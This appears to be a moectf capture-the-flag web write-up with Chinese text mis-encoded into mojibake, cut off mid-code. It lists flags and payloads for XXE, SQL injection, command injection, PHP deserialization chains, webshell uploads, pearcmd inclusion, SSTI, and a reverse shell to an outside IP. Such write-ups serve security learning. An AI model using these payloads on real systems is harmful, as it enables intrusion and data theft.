jsfuckå³å¯\n\nmoectf&#123;jv@vScr1p7_14_so0o0o0o_inT3r3&amp;t!!!&#125;\n\n2.\nmoectf&#123;f_i2_1s_Your_g00d_fri3nd!!&#125;\n\n3.ç¬¬ä¸€ä¸ªé¡µé¢æºä»£ç å¾—åˆ°è·¯ç”±&#x2F;golden_trail,è®¿é—®ä¹‹åæŠ“åŒ…\n\nmoectf&#123;0bs3rv3_Th3_Gold3n_traiL&#125;\n\n4.æŠ“åŒ…æ”¹å‚æ•°å³å¯\nè®°å¾—è¦ç”¨POSTçš„æ–¹å¼å‘åŒ…,åŸå› å¯ä»¥çœ‹jsä»£ç \n\nmoectf&#123;g3T_P05T-TransmISsiON_1S-a-Go0d-mEtHOd!!1218&#125;\n\n5.ç›®å½•ç©¿è¶Š\n\nmoectf&#123;41I_1NpuT-Is_mA1ICi0u557f1e193&#125;\n\n6.ç¬¬ä¸€å…³getä¼ å‚\n\nbW9lY3Rme0Mw\n\nç¬¬äºŒå…³postä¼ å‚\n\nbjZyNDd1MTQ3\n\nç¬¬ä¸‰å…³æ”¹xffå¤´\n\nMTBuNV95MHVy\n\nç¬¬å››å…³æ”¹uaå¤´\n\nX2g3N1BfbDN2\n\nç¬¬äº”å…³:cookieæ”¹æˆå¦‚ä¸‹\n\nM2xfMTVfcjM0\n\nç¬¬å…­å…³:\n\nbGx5X2gxOWgh\n\nç¬¬ä¸ƒå…³:å‘é€putè¯·æ±‚\nimport requestsurl = &quot;http://192.168.0.114:50602/void_rebirth&quot;data = &quot;æ–°ç”Ÿï¼&quot;headers = &#123;    &quot;Content-Type&quot;: &quot;text/plain&quot;&#125;response = requests.put(url, data=data, headers=headers)print(response.status_code)print(response.text)\n\n\nfQ==\n\næ•´åˆèµ·æ¥\nbW9lY3Rme0MwbjZyNDd1MTQ3MTBuNV95MHVyX2g3N1BfbDN2M2xfMTVfcjM0bGx5X2gxOWghbGx5X2gxOWghfQ==moectf&#123;C0n6r47u14710n5_y0ur_h77P_l3v3l_15_r34lly_h19h!lly_h1&#125;\n\n7.ä¸‡èƒ½å¯†ç å°±èƒ½ç™»å½•\n\nmoectf&#123;w3IcoMe-T0-5QI_InjECtlOnl1137fd3f6&#125;\n\n8.\n&lt;?phphighlight_file(__FILE__);$flag = getenv(&#x27;FLAG&#x27;);$a = $_GET[&quot;a&quot;] ?? &quot;&quot;;$b = $_GET[&quot;b&quot;] ?? &quot;&quot;;if($a == $b)&#123;    die(&quot;error 1&quot;);&#125;if(md5($a) != md5($b))&#123;    die(&quot;error 2&quot;);&#125;echo $flag; error 1\n\nQNKCDZO240610708s878926199as155964671as214587387as214587387aæŒ‘ä¸¤ä¸ªä¸Šå»\n\n\nmoectf&#123;mdS-lS_NoT-5AF3!!43995d17e&#125;\n\n9.sqlmapç§’äº†\n\nmoectf&#123;UnIOn_bASeD_Sq1I-ftW!!1a1580091&#125;\n\n10.é›ªç³æ‰¾åˆ°æœ‰&#x2F;static&#x2F;main.jsæ–‡ä»¶\n\nlet randomNumber = Math.floor(Math.random()*10000) + 1; // 1-10000const guesses = document.querySelector(&#x27;.guesses&#x27;);const lastResult = document.querySelector(&#x27;.lastResult&#x27;);const lowOrHi = document.querySelector(&#x27;.lowOrHi&#x27;);const guessBtn = document.getElementById(&#x27;guessBtn&#x27;);const guessField = document.getElementById(&#x27;guessField&#x27;);let guessCount = 1;let resetButton;function checkGuess() &#123;  let userGuess = Number(guessField.value);  if(guessCount === 1) &#123;    guesses.textContent = &#x27;ä¸Šæ¬¡çŒœçš„æ•°ï¼š&#x27;;  &#125;  guesses.textContent += userGuess + &#x27; &#x27;;  if(userGuess === randomNumber) &#123;    lastResult.textContent = &#x27;æ­å–œä½ ï¼çŒœå¯¹äº†ï¼&#x27;;    lastResult.style.backgroundColor = &#x27;green&#x27;;    lowOrHi.textContent = &#x27;&#x27;;    guessField.disabled = true;    guessBtn.disabled = true;    // çŒœå¯¹åè¯·æ±‚flag    fetch(&#x27;/flag&#x27;, &#123;method: &#x27;POST&#x27;&#125;)      .then(res =&gt; res.json())      .then(data =&gt; &#123;        document.querySelector(&#x27;.flagResult&#x27;).textContent = &quot;FLAG: &quot; + data.flag;      &#125;);    setGameOver();  &#125; else &#123;    lastResult.textContent = &#x27;!!!æ¸¸æˆç»“æŸ!!!&#x27;;    lastResult.style.backgroundColor = &#x27;red&#x27;;    if(userGuess &lt; randomNumber) &#123;      lowOrHi.textContent = &#x27;ä½ åˆšæ‰çŒœä½äº†ï¼&#x27;;    &#125; else if(userGuess &gt; randomNumber) &#123;      lowOrHi.textContent = &#x27;ä½ åˆšæ‰çŒœé«˜äº†ï¼&#x27;;    &#125;    guessField.disabled = true;    guessBtn.disabled = true;    setGameOver();  &#125;  guessCount++;  guessField.value = &#x27;&#x27;;  guessField.focus();&#125;guessBtn.addEventListener(&#x27;click&#x27;, checkGuess);function setGameOver() &#123;  resetButton = document.createElement(&#x27;button&#x27;);  resetButton.textContent = &#x27;å¼€å§‹æ–°æ¸¸æˆ&#x27;;  document.body.appendChild(resetButton);  resetButton.addEventListener(&#x27;click&#x27;, resetGame);&#125;function resetGame() &#123;  guessCount = 1;  const resetParas = document.querySelectorAll(&#x27;.resultParas p&#x27;);  for(let i = 0; i &lt; resetParas.length; i++) &#123;    resetParas[i].textContent = &#x27;&#x27;;  &#125;  resetButton.parentNode.removeChild(resetButton);  guessField.disabled = false;  guessBtn.disabled = false;  guessField.value = &#x27;&#x27;;  guessField.focus();  lastResult.style.backgroundColor = &#x27;white&#x27;;  randomNumber = Math.floor(Math.random()*10000) + 1; // 1-10000&#125;\n\næ§åˆ¶å°ç›´æ¥çœ‹randomNumber\n\nmoectf&#123;5d439f1c-d610-e49a-f283-6711656c040b&#125;\n\n11.ç¬¬åå››ç«  å¾¡ç¥å…³Â·è¡¥å¤©ç‰ç¢‘ä¼ .htaccesså†ä¼ ä¸ªå›¾ç‰‡é©¬,flagåœ¨æ ¹ç›®å½•\n\n12.ç¬¬åç«  å¤©æœºç¬¦é˜µ_revengeä¸€ä¸ªæ–‡æœ¬æ¡†,éšä¾¿è¾“å…¥ä»€ä¹ˆè¿›å»\n\nxxeæ¼æ´,payload:\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE é˜µæ¢ [  &lt;!ENTITY hacker SYSTEM &quot;file:///flag.txt&quot;&gt;]&gt;&lt;é˜µæ¢&gt;  &lt;è§£æ&gt;&amp;hacker;&lt;/è§£æ&gt;  &lt;è¾“å‡º&gt;æœªå®šä¹‰&lt;/è¾“å‡º&gt;&lt;/é˜µæ¢&gt;\n\n\nmoectf&#123;1e866128-7abe-4caa-e010-36d7bf49ab10&#125;\n\n13.æ‘¸é‡‘å¶é‡FLAGï¼Œæ‹¼å°½å…¨åŠ›éš¾æˆ˜èƒœ(() =&gt; &#123;    if (!window.__hooked__) &#123;        const origFetch = window.fetch;        window.fetch = async (...args) =&gt; &#123;            const res = await origFetch(...args);            if (args[0].includes(&#x27;/get_challenge&#x27;)) &#123;                res.clone().json().then(data =&gt; &#123;                    console.log(&#x27;=== è·å–åˆ°çœŸå®ç­”æ¡ˆ ===&#x27;, data.numbers);                    window.__answer__ = data.numbers;                &#125;);            &#125;            return res;        &#125;;        window.__hooked__ = true;        console.log(&#x27;å·²æŒ‚è½½ç­”æ¡ˆæŠ“å– Hookï¼Œè¯·ç‚¹å‡»å¼€å§‹æŒ‘æˆ˜æŒ‰é’®&#x27;);        return;    &#125;    if (!window.__answer__) &#123;        console.error(&#x27;è¿˜æ²¡è·å–åˆ°ç­”æ¡ˆï¼Œè¯·å…ˆç‚¹å‡»å¼€å§‹æŒ‘æˆ˜æŒ‰é’®&#x27;);        return;    &#125;    const code = window.__answer__;    const buttons = document.querySelectorAll(&#x27;.inputContentBtnAreaItem&#x27;);    if (!buttons.length) &#123;        console.error(&#x27;æœªæ‰¾åˆ°æ•°å­—æŒ‰é’®ï¼Œè¯·ç¡®ä¿æŒ‘æˆ˜ç•Œé¢å·²åŠ è½½&#x27;);        return;    &#125;    let i = 0;    function clickNext() &#123;        if (i &gt;= code.length) &#123;            console.log(&#x27;=== è‡ªåŠ¨é€šå…³å®Œæˆ ===&#x27;);            return;        &#125;        const num = code[i];        const btn = Array.from(buttons).find(b =&gt; b.textContent.trim() === String(num));        if (btn) &#123;            btn.click();            console.log(`è¾“å…¥ç¬¬$&#123;i+1&#125;ä½ï¼š$&#123;num&#125;`);        &#125; else &#123;            console.error(`æ‰¾ä¸åˆ°æ•°å­—æŒ‰é’®ï¼š$&#123;num&#125;`);        &#125;        i++;        // é«˜é€Ÿä½†ä¿ç•™é—´éš”ï¼Œ100ms å·²ç»éå¸¸å¿«        setTimeout(clickNext, 100);    &#125;    clickNext();&#125;)();\n\n\nmoectf&#123;53a0d1ed-ed64-9a27-8e42-8de2ccedd45c&#125;\n\n14.ç¬¬åä¸‰ç«  é€šå¹½å…³Â·çµçº¹è¯¡å½±\nçµçº¹å¿…é¡»åŒ…å«å™¬å¿ƒé­”å°ï¼ˆåå…­è¿›åˆ¶æ ¡éªŒç ï¼šFFD8FFï¼‰\n\nåœ¨jpgå°¾éƒ¨åŠ ä¸€å¥è¯æœ¨é©¬å³å¯\n\nmoectf&#123;8bc69f8d-67fc-fa57-64cf-58e31cae34c3&#125;\n\n15.ç¬¬åç«  å¤©æœºç¬¦é˜µ&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE é˜µæ¢ [  &lt;!ENTITY hacker SYSTEM &quot;file:///var/www/html/flag.txt&quot;&gt;]&gt;&lt;é˜µæ¢&gt;  &lt;è§£æ&gt;&amp;hacker;&lt;/è§£æ&gt;  &lt;è¾“å‡º&gt;&lt;/è¾“å‡º&gt;&lt;/é˜µæ¢&gt;\n\n\nmoectf&#123;G00d_7o6_4nD_XX3_Unl0ck_St4r_S34l&#125;\n\n16.ç¬¬åäºŒç«  ç‰é­„ç„å…³Â·ç ´å¦„flagåœ¨ç¯å¢ƒå˜é‡\n\nmoectf&#123;715601ed-5928-ec1b-b19c-08e6ebd67f72&#125;\n\n17.HDdssçœ‹åˆ°äº† GET å‚æ•°åç”±m,n,o,p,qè¿™äº”ä¸ªå­—æ¯ç»„æˆï¼ˆæ¯ä¸ªå­—æ¯å‡ºç°ä¸”ä»…å‡ºç°ä¸€æ¬¡ï¼‰ï¼Œé•¿åº¦æ­£å¥½ä¸º 5ï¼Œè™½ç„¶ä¸æ¸…æ¥šå­—æ¯çš„å…·ä½“é¡ºåºï¼Œä½†æ˜¯ä»–çŸ¥é“å‚æ•°åç­‰äºå‚æ•°å€¼æ‰èƒ½è¿›å…¥\n\nå…ˆå‡†å¤‡å¥½å‚æ•°å’Œå€¼\nimport itertools# å­—æ¯åˆ—è¡¨letters = [&#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;]# ç”Ÿæˆæ‰€æœ‰å¯èƒ½çš„æ’åˆ—permutations = list(itertools.permutations(letters))# æ‰“å¼€æ–‡ä»¶å¹¶å†™å…¥with open(&#x27;1.txt&#x27;, &#x27;w&#x27;) as file:    for perm in permutations:        # å°†æ’åˆ—è½¬æ¢ä¸ºå­—ç¬¦ä¸²        param = &#x27;&#x27;.join(perm)        # å†™å…¥ ?xxxxx=xxxxx æ ¼å¼        file.write(f&#x27;?&#123;param&#125;=&#123;param&#125;\\n&#x27;)\n\næ”¾åœ¨bpé‡Œçˆ†ç ´\n\nç”¨å¾—åˆ°çš„å‚æ•°å’Œå€¼è®¿é—®,ç”¨ä¼ªåè®®è¯».&#x2F;flag.php\nphp://filter/read=convert.base64-encode/resource=./flag.php\n\n\nPD9waHANCmVjaG8gImZsYWflsLHlnKjov5nkuobvvIznnIvkuI3liLDlkJfvvIzmmK/ogIHlvJ/looPnlYzkuI3lpJ/lkKciOw0KLy9tb2VjdGZ7ZGJkOTFlOTItZDI4Yi0zYTMwLWMyNjItMWNhNDNjOWE1M2MyfQ==moectf&#123;dbd91e92-d28b-3a30-c262-1ca43c9a53c2&#125;\n\n18.127.0.0.1; cat /proc/self/environ | grep -i flag\n\n\nmoectf&#123;ee2f1402-c648-2d0b-52ed-f5b30d41e8f6&#125;\n\n19.ç»™äº†å‡ ä¸ªé™„ä»¶\nindex.php&lt;?phperror_reporting(0);highlight_file(__FILE__);include($_GET[&#x27;file&#x27;] . &quot;.php&quot;);php.ini[PHP]allow_url_fopen = Onallow_url_include = Onentrypoint.sh#!/bin/bashecho $FLAG &gt; /flag-$(cat /dev/urandom | tr -dc &#x27;a-zA-Z0-9&#x27; | head -c 30).txtunset FLAGapache2-foreground\n\né¦–å…ˆå°è¯•äº†åå¼¹shell\n&lt;?phpsystem(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/http://47.122.131.175//2333 0&gt;&amp;1&#x27;&quot;);?&gt;æ²¡ç”¨\n\nå‘ç°æ˜¯pearcmdæ–‡ä»¶åŒ…å«\nhttps://blog.csdn.net/m0_56019217/article/details/143868969\nhttp://127.0.0.1:52970/?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/%3C?=eval($_POST[1]);?%3E+/var/www/html/shell.php\n\nè¿™ä¸€æ­¥è¦ç”¨bpä¼ ,ç„¶åè®¿é—®shell.phpå³å¯rce\n\nmoectf&#123;295f1bc5-65de-55a1-2f82-0c41669e1bf5&#125;\n\n20.&lt;?phphighlight_file(__FILE__);class A &#123;    public $a;    function __destruct() &#123;        eval($this-&gt;a);    &#125;&#125;if(isset($_GET[&#x27;a&#x27;])) &#123;    unserialize($_GET[&#x27;a&#x27;]);&#125;\n\n&lt;?phpclass A &#123;    public $a = &quot;system(&#x27;ls /&#x27;);&quot;;&#125;$a = new A();echo serialize($a);&lt;?phpclass A &#123;    public $a = &quot;system(&#x27;cat /f*&#x27;);&quot;;&#125;$a = new A();echo serialize($a);\n\n\nmoectf&#123;b7e12fcd-b8c3-edcf-db0a-e85c070d7b45&#125;\n\n21.&lt;?phphighlight_file(__FILE__);class PersonA &#123;    private $name;    function __wakeup() &#123;        $name=$this-&gt;name;        $name-&gt;work();    &#125;&#125;class PersonB &#123;    public $name;    function work()&#123;        $name=$this-&gt;name;        eval($name);    &#125;&#125;if(isset($_GET[&#x27;person&#x27;])) &#123;    unserialize($_GET[&#x27;person&#x27;]);&#125;\n\né€šè¿‡personAè°ƒç”¨personBä¸­çš„work()æ–¹æ³•è§¦å‘eval,æƒ³è¦æŠŠä¸€ä¸ªå¯¹è±¡èµ‹å€¼ç»™ä¸€ä¸ªå¯¹è±¡å±æ€§ï¼Œè€Œä¸”è¿˜æ˜¯ç§æœ‰çš„å±æ€§ï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥èµ‹å€¼ï¼Œä¹Ÿä¸èƒ½åœ¨å¤–é¢èµ‹å€¼ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ __construct æ„é€ å‡½æ•°æ¥èµ‹å€¼\n&lt;?phpclass PersonA &#123;    private $name;    public function __construct($xxx) &#123;        $this-&gt;name = $xxx;    &#125;&#125;class PersonB &#123;    public $name = &quot;system(&#x27;cat /f*&#x27;);&quot;; // ä»»æ„PHPä»£ç &#125;$b=new personB();$a=new PersonA($b);echo urlencode(serialize($a));?&gt;moectf&#123;84e140ac-1a09-8161-6c26-78c2c6517bfe&#125;\n\n22.&lt;?phphighlight_file(__FILE__);class Person&#123;    public $name;    public $id;    public $age;    public function __invoke($id)    &#123;        $name = $this-&gt;id;        $name-&gt;name = $id;        $name-&gt;age = $this-&gt;name;    &#125;&#125;class PersonA extends Person&#123;    public function __destruct()    &#123;        $name = $this-&gt;name;        $id = $this-&gt;id;        $age = $this-&gt;age;        $name-&gt;$id($age);//æ¼æ´ç‚¹,æŠŠ$nameèµ‹å€¼ä¸ºå¯¹è±¡,æ–¹æ³•åä¸º $idï¼Œå‚æ•°ä¸º $age    &#125;&#125;class PersonB extends Person&#123;    public function __set($key, $value)    &#123;        $this-&gt;name = $value;    &#125;&#125;class PersonC extends Person&#123;    public function __Check($age)    &#123;        if(str_contains($this-&gt;age . $this-&gt;name,&quot;flag&quot;))        &#123;            die(&quot;Hacker!&quot;);        &#125;        $name = $this-&gt;name;        $name($age);    &#125;    public function __wakeup()    &#123;        $age = $this-&gt;age;        $name = $this-&gt;id;        $name-&gt;age = $age;        $name($this);    &#125;&#125;if(isset($_GET[&#x27;person&#x27;]))&#123;    $person = unserialize($_GET[&#x27;person&#x27;]);&#125;\n\nPersonA::__destruct()ï¼š$name = $this-&gt;name;$id = $this-&gt;id;$age = $this-&gt;age;$name-&gt;$id($age);  //è¿™é‡Œæ˜¯åŠ¨æ€è°ƒç”¨æ–¹æ³•ï¼šå¯¹è±¡$name çš„æ–¹æ³•åä¸º $idï¼Œå‚æ•°ä¸º $ageã€‚æˆ‘ä»¬å¯ä»¥å°† $name è®¾ç½®ä¸ºä¸€ä¸ª PersonC å¯¹è±¡ï¼Œ$id è®¾ç½®ä¸º &quot;__Check&quot;ï¼Œ$age è®¾ç½®ä¸º &quot;cat flag&quot;ï¼Œä»è€Œè°ƒç”¨ PersonCé‡Œçš„__Check(&quot;cat flag&quot;)ã€‚PersonC::__Check($age)ï¼šå…ˆæ£€æŸ¥ if (str_contains($this-&gt;age . $this-&gt;name, &quot;flag&quot;)) die(&quot;Hacker!&quot;);æˆ‘ä»¬è®¾ç½® PersonC çš„ $age = &quot;&quot;ï¼Œ$name = &quot;system&quot;ï¼Œæ‰€ä»¥ &quot;&quot; . &quot;system&quot; = &quot;system&quot;ï¼Œä¸åŒ…å« &quot;flag&quot;ï¼Œç»•è¿‡æ£€æŸ¥ã€‚ç„¶å $name = $this-&gt;name;ï¼ˆå³ &quot;system&quot;ï¼‰$name($age);  // è¿™é‡Œ $name æ˜¯å­—ç¬¦ä¸² &quot;system&quot;ï¼Œä½†åœ¨ PHP ä¸­ï¼Œå¦‚æœå­—ç¬¦ä¸²æ˜¯å†…ç½®å‡½æ•°åï¼Œå¯ä»¥ç›´æ¥ä½œä¸ºå‡½æ•°è°ƒç”¨ ã€‚PersonC::__wakeup()ï¼šåœ¨ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨ï¼ˆå› ä¸º PersonC æ˜¯ PersonA çš„å±æ€§ï¼‰ã€‚Person::__invoke($id)ï¼šåœ¨ __wakeup() ä¸­è¢«è°ƒç”¨ï¼Œç”¨äºè®¾ç½®åµŒå¥—å¯¹è±¡çš„å±æ€§ç»•è¿‡ç‚¹ï¼šæ£€æŸ¥åªé’ˆå¯¹ $this-&gt;age . $this-&gt;nameï¼Œä¸æ£€æŸ¥å‚æ•° $ageï¼Œæ‰€ä»¥ &quot;cat flag&quot; å¯ä»¥åŒ…å« &quot;flag&quot; è€Œä¸ä¼šè§¦å‘ dieã€‚æ€»ä½“é“¾è·¯ï¼šååºåˆ—åŒ– PersonA â†’ è°ƒç”¨ __wakeup()ï¼ˆåœ¨ PersonC ä¸Šï¼Œè®¾ç½®åµŒå¥—å±æ€§ï¼‰ â†’ è„šæœ¬ç»“æŸè°ƒç”¨ PersonA::__destruct() â†’ è°ƒç”¨ PersonC::__Check(&quot;cat flag&quot;) â†’ ç»•è¿‡æ£€æŸ¥ â†’ è°ƒç”¨ system(&quot;cat flag&quot;)ã€‚\n\n&lt;?phpclass Person &#123;    public $name;    public $id;    public $age;&#125;class PersonA extends Person &#123;&#125;class PersonB extends Person &#123;&#125;class PersonC extends Person &#123;&#125;$p2 = new Person();$p1 = new Person();$p1-&gt;id = $p2; // PersonC å¯¹è±¡ (PC)$pc = new PersonC();$pc-&gt;name = &quot;system&quot;;$pc-&gt;id = $p1;        $pc-&gt;age = &quot;&quot;;       $pa = new PersonA();$pa-&gt;name = $pc;      $pa-&gt;id = &quot;__Check&quot;;   $pa-&gt;age = &quot;cat flag&quot;;$serialized = serialize($pa);echo $serialized . PHP_EOL;?&gt;O:7:&quot;PersonA&quot;:3:&#123;s:4:&quot;name&quot;;O:7:&quot;PersonC&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;system&quot;;s:2:&quot;id&quot;;O:6:&quot;Person&quot;:1:&#123;s:2:&quot;id&quot;;O:6:&quot;Person&quot;:0:&#123;&#125;&#125;s:3:&quot;age&quot;;s:0:&quot;&quot;;&#125;s:2:&quot;id&quot;;s:7:&quot;__Check&quot;;s:3:&quot;age&quot;;s:8:&quot;cat flag&quot;;&#125;\n\n23.ç¬¬åä¹ç« _revenge&lt;?phphighlight_file(__FILE__);class Person&#123;    public $name;    public $id;    public $age;&#125;class PersonA extends Person&#123;    public function __destruct()    &#123;        $name = $this-&gt;name;//nameè®¾ç½®æˆnew personCå¯¹è±¡        $id = $this-&gt;id;//idå³å‡½æ•°å        $name-&gt;$id($this-&gt;age); name=new personC,id=check,age=env    &#125;&#125;class PersonB extends Person&#123;    public function __set($key, $value)    &#123;        $this-&gt;name = $value;    &#125;    public function __invoke($id)    &#123;        $name = $this-&gt;id;        $name-&gt;name = $id;        $name-&gt;age = $this-&gt;name;    &#125;&#125;class PersonC extends Person&#123;    public function check($age)    &#123;        $name=$this-&gt;name;        if($age == null)        &#123;            die(&quot;Age can&#x27;t be empty.&quot;);        &#125;        else if($name === &quot;system&quot;)        &#123;            die(&quot;Hacker!&quot;);        &#125;        else        &#123;            var_dump($name($age));        &#125;    &#125;    public function __wakeup()    &#123;        $name = $this-&gt;id;//è¿™é‡Œ$nameéœ€è¦ä¸ºpersonBå¯¹è±¡è§¦å‘invoke        $name-&gt;age = $this-&gt;age;        $name($this);//__invokeè§¦å‘ç‚¹,    &#125;&#125;if(isset($_GET[&#x27;person&#x27;]))&#123;    $person = unserialize($_GET[&#x27;person&#x27;]);&#125;\n\né“¾å°¾åœ¨personCçš„var_dumpé‡Œ,åœ¨personAä¸­åŠ¨æ€è°ƒç”¨$id($this-&gt;age),personCä¸­$thisæ˜¯ PHP ä¸­æŒ‡å‘å½“å‰å¯¹è±¡çš„æŒ‡é’ˆ\n&lt;?phpclass Person &#123;    public $name;    public $id;    public $age;&#125;class PersonA extends Person &#123;&#125;class PersonB extends Person &#123;&#125;class PersonC extends Person &#123;&#125;// åµŒå¥—å¯¹è±¡$p1 = new Person();$pb = new PersonB();$pb-&gt;id = $p1;$pc = new PersonC();$pc-&gt;name = &quot;shell_exec&quot;;  // é•¿åº¦è‡ªåŠ¨ä¸º 10$pc-&gt;id = $pb;$pc-&gt;age = &quot;&quot;;$pa = new PersonA();$pa-&gt;name = $pc;$pa-&gt;id = &quot;check&quot;;$pa-&gt;age = &quot;cat flag&quot;;// åºåˆ—åŒ–$serialized = serialize($pa);echo $serialized . PHP_EOL;?&gt;O:7:&quot;PersonA&quot;:3:&#123;s:4:&quot;name&quot;;O:7:&quot;PersonC&quot;:3:&#123;s:4:&quot;name&quot;;s:10:&quot;shell_exec&quot;;s:2:&quot;id&quot;;O:7:&quot;PersonB&quot;:1:&#123;s:2:&quot;id&quot;;O:6:&quot;Person&quot;:0:&#123;&#125;&#125;s:3:&quot;age&quot;;s:0:&quot;&quot;;&#125;s:2:&quot;id&quot;;s:5:&quot;check&quot;;s:3:&quot;age&quot;;s:3:&quot;env&quot;;&#125;\n\n\nmoectf&#123;832295b9-1e23-6426-dfd4-a7385f5504cf&#125;\n\n24.ç¥ç§˜çš„æ‰‹é•¯_revengeæç¤º\nwanyanzhou.txté‡Œé¢äº†......ä½†æ˜¯æˆ‘å¿˜è®°å¯†ç æ˜¯å•¥äº†ï¼Œè€Œä¸”ä¸å°å¿ƒæŠŠä¿å­˜å¯†ç çš„æ–‡ä»¶åˆ äº†......HDdssï¼šè¿™...åº”è¯¥æœ‰å¤‡ä»½å§ï¼ŸKçš‡ï¼šç¡®å®æœ‰\n\nè®¿é—®wanyanzhou.txt.bak,å¾—åˆ°å¯†é’¥,\n\nç”¨bpæŠ“è¯·æ±‚åŒ…æŠ“ä¸åˆ°,å°†åŸæ¥çš„é¡µé¢æŒ‰ F12 æ‰“å¼€ï¼Œå‘ç°è¢«åè°ƒè¯•äº†\næˆ‘ä»¬å³é”®å·¦ä¾§çš„ shouzhuo.js å‘å¿½ç•¥åˆ—è¡¨æ·»åŠ è„šæœ¬ï¼Œç„¶åç‚¹å³ä¾§çš„ç»§ç»­æ‰§è¡Œè„šæœ¬ï¼Œå³å¯ç»§ç»­è°ƒè¯•ï¼š\n\nç„¶åç‚¹è®¾ç½®ï¼Œç¦ç”¨ javascript ï¼Œå°†åˆšæ‰çš„ 10000 é•¿åº¦çš„å¯†ç å¤åˆ¶è¿›å»ï¼šå†bpæŠ“åŒ…,æœ€åå‘åˆ°çˆ†ç ´æ¨¡å—é‡å¤äº”ç™¾æ¬¡NULL payloadå³å¯\n\nmoectf&#123;d3a28e96-b84f-5518-4c0d-c65597fd4712&#125;\n\n25.ç¬¬åäº”ç«  å½’çœŸå…³Â·ç«æ—¶å‡€é­”æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ 1.phpï¼Œåªè¦è®¿é—®å°±ä¼šç”Ÿæˆä¸€ä¸ªæœ¨é©¬æ–‡ä»¶ï¼Œå…¶å†…å®¹ä¸ºï¼š\nGIF89a&lt;?php file_put_contents(&quot;2.php&quot;,&quot;&lt;?php eval(\\$_POST[&#x27;cmd&#x27;]);?&gt;&quot;);?&gt;\n\nbpæŠ“åŒ…,æ”¹mime,ç„¶åå‘åˆ°çˆ†ç ´æ¨¡å—,ç»§ç»­ç”¨NULL payloadçˆ†ç ´\nç„¶ååœ¨å†™ä¸€ä¸ªè„šæœ¬ä¸€ç›´è®¿é—®1.php\nimport threading, requests, timeBASE = &quot;http://127.0.0.1:57743&quot;TARGET = BASE + &quot;/uploads/1.php&quot;THREADS = 10TIMEOUT = 2stop = threading.Event()counter = &#123;&quot;req&quot;: 0, &quot;hit&quot;: 0&#125;lock = threading.Lock()def fetcher(idx):    sess = requests.Session()    while not stop.is_set():        try:            url = f&quot;&#123;TARGET&#125;?_=&#123;int(time.time()*1000)&#125;&quot;            r = sess.get(url, timeout=TIMEOUT)            with lock:                counter[&quot;req&quot;] += 1            if r.status_code == 200:                with lock:                    counter[&quot;hit&quot;] += 1                print(f&quot;[HIT] Thread-&#123;idx&#125; got 200, len=&#123;len(r.content)&#125;&quot;)                print(&quot;  å‰20å­—èŠ‚:&quot;, r.content[:20])        except Exception as e:            pass def reporter():    while not stop.is_set():        time.sleep(3)        with lock:            print(f&quot;[STAT] total=&#123;counter[&#x27;req&#x27;]&#125; hits=&#123;counter[&#x27;hit&#x27;]&#125;&quot;) if __name__ == &quot;__main__&quot;:    print(&quot;[*] ç–¯ç‹‚è®¿é—®:&quot;, TARGET)    for i in range(THREADS):        threading.Thread(target=fetcher, args=(i,), daemon=True).start()    threading.Thread(target=reporter, daemon=True).start()    try:        while True:            time.sleep(1)    except KeyboardInterrupt:        stop.set()        print(&quot;[*] åœæ­¢ã€‚&quot;)\n\nç›´åˆ°è¿”å›çš„å­—èŠ‚æœ‰gif89aä¸ºæ­¢,èšå‰‘è¿2.php\n\n```### 26.å¹½å†¥è¡€æµ·Â·å¹»è¯­å¿ƒé­”ç»™äº†app.py```pythonfrom flask import Flask, request, render_template, render_template_stringapp = Flask(__name__)@app.route(&#x27;/&#x27;)def index():    if &#x27;username&#x27; in request.args or &#x27;password&#x27; in request.args:        username = request.args.get(&#x27;username&#x27;, &#x27;&#x27;)        password = request.args.get(&#x27;password&#x27;, &#x27;&#x27;)        if not username or not password:            login_msg = &quot;&quot;&quot;            &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;                &lt;div class=&quot;result-title&quot;&gt;é˜µæ³•åé¦ˆ&lt;/div&gt;                &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-fail&#x27;&gt;ç”¨æˆ·åæˆ–å¯†ç ä¸èƒ½ä¸ºç©º&lt;/div&gt;&lt;/div&gt;            &lt;/div&gt;            &quot;&quot;&quot;        else:            login_msg = render_template_string(f&quot;&quot;&quot;            &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;                &lt;div class=&quot;result-title&quot;&gt;é˜µæ³•åé¦ˆ&lt;/div&gt;                &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-success&#x27;&gt;æ¬¢è¿: &#123;username&#125;&lt;/div&gt;&lt;/div&gt;            &lt;/div&gt;            &quot;&quot;&quot;)    else:        login_msg = &quot;&quot;    return render_template(&quot;index.html&quot;, login_msg=login_msg)if __name__ == &#x27;__main__&#x27;:    app.run(host=&#x27;0.0.0.0&#x27;, port=80)\n\nusernameå¯æ§å¹¶ä¸”å­˜åœ¨ssti\n&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[141].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;\n\n\n&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[141].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /f*&#x27;).read()&#125;&#125;\n\n\nmoectf&#123;a53a1e79-698c-d929-a976-4afcbddd6b32&#125;\n\n27.å¾€ç”Ÿæ¼©æ¶¡Â·è¨€çµæ­»å±€è¿™é¢˜å¤šäº†ä¸ªwaf\nfrom flask import Flask, request, render_template, render_template_stringapp = Flask(__name__)blacklist = [&quot;__&quot;, &quot;global&quot;, &quot;&#123;&#123;&quot;, &quot;&#125;&#125;&quot;]@app.route(&#x27;/&#x27;)def index():    if &#x27;username&#x27; in request.args or &#x27;password&#x27; in request.args:        username = request.args.get(&#x27;username&#x27;, &#x27;&#x27;)        password = request.args.get(&#x27;password&#x27;, 